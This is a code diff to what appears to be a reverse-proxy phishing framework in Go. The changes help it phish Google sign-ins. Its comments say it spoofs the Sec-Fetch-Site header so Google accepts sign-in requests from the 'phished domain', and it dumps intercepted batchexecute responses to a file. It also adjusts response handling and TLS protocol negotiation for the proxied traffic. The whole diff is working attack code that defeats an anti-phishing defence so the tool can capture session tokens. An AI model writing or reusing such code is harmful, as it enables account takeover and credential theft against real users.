@@ -855,6 +855,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
+				// fix sec-fetch-site: override cross-site to same-origin
+				// The browser sends cross-site because the phished domain != original domain.
+				// Google's server validates this and rejects non-same-origin sign-in requests.
+				sec_fetch_site := req.Header.Get("Sec-Fetch-Site")
+				if sec_fetch_site == "cross-site" || sec_fetch_site == "same-site" {
+					req.Header.Set("Sec-Fetch-Site", "same-origin")
+				}
+
 				// fix referer
 				referer := req.Header.Get("Referer")
 				if referer != "" {
@@ -1261,6 +1269,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// modify received body
 			body, err := ioutil.ReadAll(resp.Body)
 
+			// Temporary debug: dump batchexecute responses
+			if resp.Request != nil && strings.Contains(resp.Request.URL.Path, "batchexecute") {
+				ioutil.WriteFile("/tmp/batchexecute_response.txt", body, 0644)
+				bodyPreview := string(body)
+				if len(bodyPreview) > 500 {
+					bodyPreview = bodyPreview[:500]
+				}
+				log.Debug("BATCHEXECUTE RESPONSE: status=%d bodyLen=%d preview=%s", resp.StatusCode, len(body), bodyPreview)
+			}
+
+
 			if pl != nil {
 				if s, ok := p.sessions[ps.SessionId]; ok {
 					// capture body response tokens
@@ -1511,6 +1530,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+				resp.ContentLength = int64(len(body))
+				resp.Header.Del("Content-Length")
+
 			}
 
 			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
@@ -1946,7 +1968,7 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 		if !p.developer {
 
 			tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
-			tls_cfg.NextProtos = []string{"h2", "http/1.1", tlsalpn01.ACMETLS1Protocol}
+			tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol}
 
 			return tls_cfg, nil
 		} else {
